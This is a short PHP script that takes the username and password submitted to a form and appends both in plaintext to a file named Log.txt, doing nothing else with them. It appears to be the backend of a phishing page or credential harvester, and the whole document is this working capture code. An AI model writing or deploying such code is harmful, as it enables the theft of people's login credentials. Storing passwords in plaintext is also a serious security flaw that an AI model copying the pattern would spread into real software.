<?php
	$Username = $_POST['Username'];
	$Password = $_POST['Password'];
	
	$LogFile = "Log.txt";
	
	$fp = fopen($LogFile, "a");
	
	fwrite($fp, "Username: " . $Username . "\n");
	fwrite($fp, "Password: " . $Password . "\n");
	fclose($fp);
?>